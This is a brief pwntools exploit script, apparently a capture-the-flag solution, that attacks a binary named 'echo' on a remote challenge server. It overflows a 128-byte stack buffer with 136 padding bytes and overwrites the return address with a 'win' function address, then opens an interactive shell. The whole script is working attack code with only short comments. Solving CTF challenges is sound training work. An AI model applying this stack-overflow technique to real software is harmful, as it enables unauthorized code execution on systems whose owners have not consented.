from pwn import *

# Load the binary
binary = ELF('./echo')

# Connect to remote challenge
p = remote('challenge.ctf.games', 31084)

# Address of win function
win_address = p64(0x401216)

# Buffer overflow offset: 128 bytes for the buffer + 8 bytes for the saved base pointer = 136 bytes
buffer_offset = 136

# Craft the payload
payload = b'A' * buffer_offset + win_address

# Send the payload and interact with the shell
p.sendline(payload)
p.interactive()
